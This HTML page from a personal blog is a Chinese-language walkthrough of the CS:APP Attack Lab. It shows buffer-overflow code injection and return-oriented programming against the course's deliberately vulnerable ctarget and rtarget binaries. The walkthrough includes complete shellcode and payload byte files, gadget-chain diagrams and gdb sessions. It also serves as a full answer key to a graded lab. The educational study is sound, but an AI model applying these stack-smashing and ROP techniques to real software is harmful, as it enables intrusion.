@@ -1,0 +1,524 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>CSAPP - Attack Lab - Sugar&#x27;s Blog</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="theme/toc.css">
+        <!-- MathJax -->
+        <script async type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="about.html">About</a></li><li class="chapter-item expanded affix "><li class="part-title">2023</li><li class="chapter-item expanded "><a href="blog20230222.html">CS 161 REGULUS</a></li><li class="chapter-item expanded "><a href="blog20230406.html">MIT 6.858 Lab3: Symbolic execution</a></li><li class="chapter-item expanded "><a href="blog20230110.html">Computer Security - Buffer overflows</a></li><li class="chapter-item expanded "><div>MIT 6.007 Signals And Systems</div></li><li class="chapter-item expanded affix "><li class="part-title">2022</li><li class="chapter-item expanded "><a href="blog20221209.html">来点utterances</a></li><li class="chapter-item expanded "><a href="blog20221129.html">红黑树</a></li><li class="chapter-item expanded "><a href="blog20221113.html">B+Tree</a></li><li class="chapter-item expanded "><a href="blog20221105.html">CMU 15-445/645</a></li><li class="chapter-item expanded "><a href="blog20221028.html">构建mdbook的博客</a></li><li class="spacer"></li><li class="chapter-item expanded "><a href="blog20220726.html">MIT 6.824 kvraft</a></li><li class="chapter-item expanded "><a href="blog20220630.html">MIT 6.S081 mmap</a></li><li class="chapter-item expanded "><a href="blog20220519.html">frp内网穿透实践</a></li><li class="chapter-item expanded "><a href="blog20220517.html">画饼</a></li><li class="chapter-item expanded "><a href="blog20220507.html">母亲节快乐</a></li><li class="chapter-item expanded "><a href="blog20220430.html">MIT 6.S081 File System</a></li><li class="chapter-item expanded "><a href="blog20220424.html">MIT 6.S081 Locks</a></li><li class="chapter-item expanded "><a href="blog20220422.html">Docker实践</a></li><li class="chapter-item expanded "><a href="blog20220224.html">MIT 6.S081 Network Driver</a></li><li class="chapter-item expanded affix "><li class="part-title">2021</li><li class="chapter-item expanded "><a href="blog20211231.html">Slurm单机部署</a></li><li class="chapter-item expanded "><a href="blog20211119.html">MIT 6.S081 COW</a></li><li class="chapter-item expanded "><a href="blog20211024.html">MIT 6.S081 Traps</a></li><li class="chapter-item expanded "><a href="blog20211017.html">MIT 6.S081 Page Tables</a></li><li class="chapter-item expanded "><a href="blog20211012.html">MIT 6.828 System calls</a></li><li class="chapter-item expanded "><a href="blog20210926.html">MIT 6.828 Util Lab</a></li><li class="chapter-item expanded "><a href="blog20210805.html">可靠数据传输协议</a></li><li class="chapter-item expanded "><a href="blog20210715.html">CSAPP - Proxy Lab</a></li><li class="chapter-item expanded "><a href="blog20210512.html">Raft</a></li><li class="chapter-item expanded "><a href="blog20210503.html">CSAPP - Malloc Lab</a></li><li class="chapter-item expanded "><a href="blog20210419.html">CSAPP - Shell Lab</a></li><li class="chapter-item expanded "><a href="blog20210323.html">CSAPP - Cache Lab</a></li><li class="chapter-item expanded "><a href="blog20210308.html">CSAPP - Arch Lab</a></li><li class="chapter-item expanded "><a href="blog20210219.html" class="active">CSAPP - Attack Lab</a></li><li class="chapter-item expanded "><a href="blog20210206.html">CSAPP - Bomb Lab</a></li><li class="chapter-item expanded "><a href="blog20210203.html">CSAPP - Data Lab</a></li><li class="chapter-item expanded affix "><li class="part-title">2020</li><li class="chapter-item expanded "><a href="blog20201011.html">MIT 6.824 MapReduce</a></li><li class="chapter-item expanded "><a href="blog20200201.html">MagicCube</a></li><li class="chapter-item expanded "><a href="blog20200116.html">bluelog</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Sugar&#x27;s Blog</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/Sugar-Coder/Sugar-Coder.github.io" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <div class="sidetoc"><nav class="pagetoc"></nav></div>
+                    <main>
+                        <h1 id="csapp---attack-lab"><a class="header" href="#csapp---attack-lab">CSAPP - Attack Lab</a></h1>
+<h2 id="ctarget-level-1"><a class="header" href="#ctarget-level-1">CTarget level 1</a></h2>
+<p>根据<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">writeup</a>中的提示，用code-injection的方法使原程序执行想要的函数（touch1），主要用到的知识在书中的第三章的内存越界和缓冲区溢出章节可以看到。需要使用objdump反汇编可执行文件，找到目标函数touch1的入口地址为0x4017c0。攻击的原理是，程序运行时会调用Gets从标准输入读入字符串，但是Gets函数的实现是不安全的，没有进行边界检查，读入的字符串可能会超过缓冲区的大小。</p>
+<pre><code class="language-c">unsigned getbuf() {
+    char buf[BUFFER_SIZE];
+    Gets(buf);
+    return 1;
+}
+</code></pre>
+<p>所以，让Gets函数读入超过在栈上分配的空间大小的字符串，同时覆盖栈帧上的返回地址（8字节），可以使得getbuf在返回的时候，ret指令读取$rsp指向的栈上的内容是我们想要的touch1函数入口地址。由于BUFFER_SIZE是编译阶段确定的常量，需要从汇编代码中确定缓冲区的大小。</p>
+<pre><code class="language-x86asm">00000000004017a8 &lt;getbuf&gt;:
+  4017a8:    48 83 ec 28              sub    $0x28,%rsp
+  4017ac:    48 89 e7                 mov    %rsp,%rdi
+  4017af:    e8 8c 02 00 00           callq  401a40 &lt;Gets&gt;
+  4017b4:    b8 01 00 00 00           mov    $0x1,%eax
+  4017b9:    48 83 c4 28              add    $0x28,%rsp
+  4017bd:    c3                       retq   
+  4017be:    90                       nop
+  4017bf:    90                       nop
+</code></pre>
+<p>可以看到，在栈上分配了0x28即40字节的空间，所以当我们输入超过了40字节的字符串，利用Gets的不安全性，即可覆盖栈上的getbuf的返回地址。</p>
+<p>实验工具中有一个叫做hex2raw的字节码转换工具，开始没弄懂什么意思，看了这篇<a href="https://mcginn7.github.io/2020/02/19/CSAPP-attacklab/">博文</a>才想通。原来这个工具可以将我们输入的字符表示的十六进制字节码转换为字符串。注意，输入到hex2raw的每个字节（8bit）用两位十六进制数表示，用空格或换行符分开每个字节的十六进制表示。如下是使用示例：（字符'A'的ascii码是0x41）</p>
+<p>所以要完成attack，需要输入48字节，由于x86是小端编址，低字节在低地址。每个字符依次从($rsp)填充到($rsp+47)所指向的位置，所以对于最后8个字节，我们应该先输入位于低字节的返回地址的后8位0xc0。最终的bytes内容是：</p>
+<pre><code class="language-txt">00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+</code></pre>
+<p>用hex2raw转换后作为ctarget的输入，可以实现code-injection攻击(call touch1)。</p>
+<h2 id="ctarget-level2"><a class="header" href="#ctarget-level2">CTarget level2</a></h2>
+<p>这次的注入攻击不仅要求控制跳转，还需要执行一些额外的添加指令。要求执行函数touch2中的指定if分支，所以还需要设置touch2传递的参数。</p>
+<pre><code class="language-c">void touch2(unsigned val) {
+    vlevel = 2;
+    if (val == cookie) {
+        printf(&quot;Touch 2! You have called touch2(0x%.8x)\n&quot;, val);
+        validate(2);
+    } else {
+        printf(&quot;Misfire! You have called touch2(0x%.8x)\n&quot;, val);
+        fail(2);
+    }
+    exit(0);
+}
+</code></pre>
+<p>由于不仅要使得getbuf函数结束后控制跳转到touch2，还必须设置参数val（第一个参数保存在$rdi)为cookie，才能正确触发攻击。先查看touch2的汇编代码：</p>
+<pre><code class="language-x86asm">00000000004017ec &lt;touch2&gt;:
+  4017ec:    48 83 ec 08              sub    $0x8,%rsp
+  4017f0:    89 fa                    mov    %edi,%edx
+  4017f2:    c7 05 e0 2c 20 00 02     movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;
+  4017f9:    00 00 00 
+  4017fc:    3b 3d e2 2c 20 00        cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;
+  401802:    75 20                    jne    401824 &lt;touch2+0x38&gt;
+  401804:    be e8 30 40 00           mov    $0x4030e8,%esi
+  401809:    bf 01 00 00 00           mov    $0x1,%edi
+  40180e:    b8 00 00 00 00           mov    $0x0,%eax
+  401813:    e8 d8 f5 ff ff           callq  400df0 &lt;__printf_chk@plt&gt;
+</code></pre>
+<p>发现参数val与(0x202ce2 + $rip)所指向的值比较，即与cookie比较。需要用gdb查看cookie，但是注意，这里有个坑！我一开始是把断点打到了<br />
+4017fc:    3b 3d e2 2c 20 00        cmp    0x202ce2(%rip),%edi </p>
+<p>这条指令，即<code>(gdb) break *0x4017fc</code>。在此时打印cookie的值为：</p>
+<pre><code>    (gdb) print /x *(unsigned *)($rip + 0x202ce2)$15 = 0x2f8a0000
+</code></pre>
+<p>但是注意gdb被打到断点时的指令是还未运行的指令，所以此时的rip并不是指向断点指令的下一条指令，也就不是真正的参与cmp运算的rip的值，所以要通过stepi，使断点指向下一条指令，这时候查看($rip + 0x202ce2)所指向的值：</p>
+<pre><code>(gdb) print /x *(int *)($rip + 0x202ce2)$17 = 0x59b997fa
+(gdb) print $rip$18 = (void (*)()) 0x401802 &lt;touch2+22&gt;
+</code></pre>
+<p>所以0x59b997fa才是正确的cookie的值。</p>
+<p>现在可以编写需要注入的代码了。即设置$rdi的值为cookie，之后将控制跳转到touch2，可以先使用push指令将touch2的入口地址压栈，再使用ret指令从栈中获取返回地址，从而跳转到touch2。这段代码保存在code.s文件中：</p>
+<pre><code class="language-x86asm">mov $0x59b997fa, %rdi
+push $0x4017ec
+ret
+</code></pre>
+<p>再使用gcc编译code.s为code.o目标文件，再用objdump反汇编这段代码，得到这段代码的十六进制表示：</p>
+<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ vim code.s
+sugar@ubuntuServer:~/csappLab/attacklab$ gcc -Og -c code.s
+sugar@ubuntuServer:~/csappLab/attacklab$ objdump -d code.o
+code.o:     file format elf64-x86-64
+Disassembly of section .text:
+0000000000000000 &lt;.text&gt;:
+   0:    48 c7 c7 fa 97 b9 59     mov    $0x59b997fa,%rdi
+   7:    68 ec 17 40 00           pushq  $0x4017ec
+   c:    c3                       retq  
+</code></pre>
+<p>最后一个问题，如何让程序ctarget执行这段代码呢？由于我们只能以Gets函数为突破口，输入字符串保存在栈上，所以与上一题类似，我们通过覆盖getbuf的返回地址，但这次让新返回地址指向buffer的起始地址，由于getbuf在栈上分配了buffer的空间（通过减$rsp分配了40Bytes的空间），这就是留给我们注入代码的位置。在getbuf函数执行ret指令后，跳转到我们注入的代码开始执行。</p>
+<p><img src="./images/blog20210219/buf.png" alt="" /></p>
+<p>找到buffer被分配到的地址</p>
+<pre><code class="language-txt">Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14
+14    buf.c: No such file or directory.
+(gdb) print $rsp
+$1 = (void *) 0x5561dc78
+</code></pre>
+<p>所以我们的输入bytes文件为：</p>
+<pre><code class="language-txt">48 c7 c7 fa 97 b9 59 68
+ec 17 40 00 c3 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+</code></pre>
+<p>可以正确完成攻击：</p>
+<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ vim bytes 
+sugar@ubuntuServer:~/csappLab/attacklab$ ./hex2raw &lt; bytes &gt; args.txt 
+sugar@ubuntuServer:~/csappLab/attacklab$ ./ctarget -q -i args.txt 
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+    user id    bovik
+    course    15213-f15
+    lab    attacklab
+    result    1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+</code></pre>
+<h2 id="ctarget-level3"><a class="header" href="#ctarget-level3">Ctarget level3</a></h2>
+<p>需要让ctarget执行touch3的指定分支，与touch2类似，只不过参数变成了指向一个字符串的指针。要求该字符串的值与cookie的无符号值的十六进制字符表示相等，即字符串是 <code>59b997fa</code>。</p>
+<p>同样需要将getbuf的返回地址覆盖为注入代码的起始地址，也与touch2相同为：0x5561dc78。</p>
+<p>由于hexmatch函数还会在栈上随机的破坏128字节的buffer空间，为了不让hexmatch函数破坏我们设置的字符串，注入的代码可以将rsp减去一定的值（至少保证rsp的新址超过字符串存储的起始地址），这样就可以防止字符串被破坏了。</p>
+<p>touch的参数保存在rdi中，目前还不确定字符串的起始地址，可以随便写一个</p>
+<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ vim code.s 
+sugar@ubuntuServer:~/csappLab/attacklab$ gcc -Og -c code.s
+sugar@ubuntuServer:~/csappLab/attacklab$ objdump -d code.o
+
+code.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0: 48 c7 c7 ff 17 40 00    mov    $0x4017ff,%rdi
+   7: 48 83 ec 10             sub    $0x40,%rsp
+   b: 68 fa 18 40 00          pushq  $0x4018fa
+  10: c3                      retq   
+sugar@ubuntuServer:~/csappLab/attacklab$ cat code.s
+mov $0x4017ff, %rdi
+sub $16, %rsp
+push $0x4018fa
+ret
+</code></pre>
+<p>计算真正的string需要填充到的位置：（buffer起始地址加上注入代码的字节码长度）</p>
+<pre><code>(gdb) print /x (0x5561dc78 + 17)
+$2 = 0x5561dc89
+</code></pre>
+<p>重新生成注入代码</p>
+<pre><code class="language-x86asm">Disassembly of section .text:
+
+0000000000000000 &lt;.text&gt;:
+   0: 48 c7 c7 89 dc 61 55    mov    $0x5561dc89,%rdi
+   7: 48 83 ec 40             sub    $0x40,%rsp
+   b: 68 fa 18 40 00          pushq  $0x4018fa
+  10: c3                      retq
+</code></pre>
+<p>但是并没有成功。发现问题，我在bytes中写的59b997fa是直接写入的，但是要把每个数转为ascii码：<br />
+字符：      5  9  b  9  9  7  f  a<br />
+对应ascii： 35 39 62 39 39 37 66 61</p>
+<p>再写入bytes文件：</p>
+<pre><code class="language-txt">48 c7 c7 89 dc 61 55 48
+83 ec 40 68 fa 18 40 00
+c3 35 39 62 39 39 37 66
+61 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+</code></pre>
+<p>成功！</p>
+<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ vim bytes 
+sugar@ubuntuServer:~/csappLab/attacklab$ ./hex2raw &lt; bytes &gt; args.txt 
+sugar@ubuntuServer:~/csappLab/attacklab$ ./ctarget -q -i args.txt 
+Cookie: 0x59b997fa
+Touch3!: You called touch3(&quot;59b997fa&quot;)
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+   user id  bovik
+   course   15213-f15
+   lab   attacklab
+   result   1:PASS:0xffffffff:ctarget:3:48 C7 C7 89 DC 61 55 48 83 EC 40 68 FA 18 40 00 C3 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
+</code></pre>
+<h2 id="rtarget-level2"><a class="header" href="#rtarget-level2">Rtarget level2</a></h2>
+<p>使用Return-Oriented Programming 来完成同样的touch2的攻击。这次的限制条件是不能在栈上注入代码，因为rtarget使用了栈随机化和段检查，导致程序不能执行栈上的代码。由于我不信，所以来验证一下：</p>
+<p>栈随机化：</p>
+<pre><code class="language-sh">Breakpoint 1, getbuf () at buf.c:16
+16  buf.c: No such file or directory.
+(gdb) print $rsp
+$1 = (void *) 0x7ffffffb16d0
+(gdb) kill
+Kill the program being debugged? (y or n) y
+(gdb) run -q -i args.txt 
+Starting program: /home/sugar/csappLab/attacklab/rtarget -q -i args.txt
+Cookie: 0x59b997fa
+
+Breakpoint 1, getbuf () at buf.c:16
+16  in buf.c
+(gdb) print $rs
+$2 = (void *) 0x7ffffffa6d50
+</code></pre>
+<p>发现确实两次相同断点位置的rsp的值不同。</p>
+<p>禁止执行栈上的代码</p>
+<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ ./rtarget -q -i args.txt 
+Cookie: 0x59b997fa
+Ouch!: You caused a segmentation fault!
+Better luck next time
+FAIL: Would have posted the following:.......
+</code></pre>
+<p>根据writeup中的说明，我们仍然可以用buffer的溢出来注入一些数据，但是这次只能利用源程序汇编代码中已有的字节码，断章取义，拼凑出我们想要执行的代码。</p>
+<p>比如</p>
+<pre><code class="language-x86asm">c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)
+c3                      retq
+</code></pre>
+<p>可以断章取义为：</p>
+<pre><code class="language-x86asm">48 89 c7     movq %rax, %rdi
+c3     retq
+</code></pre>
+<p>所以在利用buffer溢出的时候，在栈上填写我们想要的地址或者数据，再从源程序中找到可以构成有意义的代码的片段，完成攻击。writeup中提示，可以在rtarget的函数start_farm和mid_farm之间的汇编代码中找到想要的，所以找就完事了。下面是rtarget的反汇编文件部分内容：</p>
+<pre><code class="language-x86asm">0000000000401994 :
+  401994:	b8 01 00 00 00       	mov    $0x1,%eax
+  401999:	c3                   	retq   
+...
+
+00000000004019a7 :
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+...
+00000000004019c3 :
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+00000000004019ca :
+  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
+  4019cf:	c3                   	retq   
+
+00000000004019d0 :
+</code></pre>
+<p>下图是栈上的内容，也可以理解为最终的攻击逻辑：</p>
+<pre><code class="language-txt">            64bit          0
+            +--------------+ 0 byte
+            |   0x4017ec   |   --&gt; touch2的起始地址
+            +--------------+ -8
+            |   0x4019c5   |   --&gt; 48 89 c7, 90, c3 -&gt; movq %rax, %rdi | nop | ret (设置了touch2的参数)
+            +--------------+ -16
+            |  0x59b997fa  |    --&gt; cookie的值，也就是touch2的参数
+            +--------------+ -24
+  getbuf -&gt; |  0x4019ab    |    --&gt; 58, 90, c3 -&gt; popq %rax | nop | ret (此时rsp的值为-8，即ret跳转到0x4019c5)
+ret address +--------------+ -32
+            |              |
+            |              |
+            |              |
+            +--------------+ &lt;- buffer起始地址 -72```
+即我们让程序最终执行的代码（在getbuf的ret指令后、touch2函数的第一条指令前）可以认为是：
+```x86asm
+popq %rax
+nop
+ret
+movq %rax, %rdi
+nop
+ret
+</code></pre>
+<p>完成了ROP攻击：</p>
+<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ cat bytes 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+fa 97 b9 59 00 00 00 00
+c5 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+
+sugar@ubuntuServer:~/csappLab/attacklab$ ./hex2raw &lt; bytes &gt; args.txt 
+sugar@ubuntuServer:~/csappLab/attacklab$ ./rtarget -q -i args.txt 
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target rtarget
+PASS: Would have posted the following:
+  user id bovik
+  course  15213-f15
+  lab attacklab
+  result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
+</code></pre>
+<h2 id="rtarget-level3"><a class="header" href="#rtarget-level3">Rtarget level3</a></h2>
+<p>用ROP对touch3做攻击，所需要的gatget在start_farm到end_farm之间，所以先把能找到的gatget都翻译出来，到时候要用的时候直接可以找到。这个的难点就是计算字符串参数的地址，需要用到已经提供的lea指令，<code>lea (rdi, rsi, 1), rax</code> . 我这边画出最终攻击后的栈的内容，可以很好理解了。</p>
+<pre><code class="language-txt">            64bit          0
+            +--------------+
+            | cookie       |  = &quot;59b997fa&quot; =&gt; 35 39 62 39 39 37 66 61
+            +--------------+
+            |   0x4018fa   |  --&gt; touch3的入口地址
+            +--------------+
+            |   0x4019c5   |  --&gt; mov rax, rdi ｜ ret  # 保存到第一个参数
+            +--------------+
+            |   0x4019d6   |   --&gt; lea (rdi, rsi, 1), rax  # 计算string的真实地址
+            +--------------+
+            |   0x401a27   |   --&gt; mov ecx, esi  | ret
+            +--------------+
+            |  0x401a34    |    --&gt; mov edx, ecx  | ret
+            +--------------+
+            |   0x401a42   |  --&gt; mov eax, edx  | ret
+            +--------------+ 0 byte
+            |   0x48       |   --&gt; string的偏移量
+            +--------------+ -8
+            |   0x4019ab   |   --&gt; popq rax (string在栈上的偏移量)  | ret
+            +--------------+ -16
+            |  0x4019c5    |    --&gt; movq rax, rdi   | ret
+            +--------------+ -24
+  getbuf -&gt; |  0x401aad    |    --&gt; movq rsp, rax  | ret  # 以当前的rsp作为基址
+ret address +--------------+ -32
+            |              |
+            |              |
+            |              |
+            +--------------+ &lt;- buffer起始地址 -72
+</code></pre>
+<p>bytes文件的内容</p>
+<pre><code class="language-txt">00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ad 1a 40 00 00 00 00 00
+c5 19 40 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+42 1a 40 00 00 00 00 00
+34 1a 40 00 00 00 00 00
+27 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+c5 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+</code></pre>
+<p>完成了攻击：</p>
+<pre><code class="language-sh">sugar@ubuntuServer:~/csappLab/attacklab$ ./hex2raw &lt; bytes  &gt; args.txt 
+sugar@ubuntuServer:~/csappLab/attacklab$ ./rtarget -q -i args.txt 
+Cookie: 0x59b997fa
+Touch3!: You called touch3(&quot;59b997fa&quot;)
+Valid solution for level 3 with target rtarget
+PASS: Would have posted the following:
+  user id bovik
+  course  15213-f15
+  lab attacklab
+  result  1:PASS:0xffffffff:rtarget:
+</code></pre>
+
+                        <div id="comment-container"></div>
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="blog20210308.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="blog20210206.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="blog20210308.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="blog20210206.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+        
+        <!-- Custom JS scripts -->
+        <script type="text/javascript" src="theme/comments.js"></script>
+        <script type="text/javascript" src="theme/toc.js"></script>
+    </body>
+</html>
